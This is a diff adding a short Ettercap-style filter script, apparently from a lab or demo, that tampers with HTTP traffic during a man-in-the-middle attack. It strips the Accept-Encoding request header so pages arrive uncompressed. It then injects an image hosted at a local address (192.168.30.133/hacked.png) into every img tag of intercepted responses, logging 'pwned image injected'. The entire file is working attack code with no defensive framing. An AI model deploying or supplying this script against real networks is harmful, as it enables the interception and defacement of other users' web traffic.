@@ -1,0 +1,14 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+	  # note: replacement string is same length as original string
+      msg("zapped Accept-Encoding!\n");
+   }
+}
+if (ip.proto == TCP && tcp.src == 80) {
+   replace("img src=", "img src=\"http://192.168.30.133/hacked.png\" ");
+   replace("IMG src=", "img src=\"http://192.168.30.133/hacked.png\" ");
+   msg("pwned image injected\n");
+}
+
+msg("traffic...");
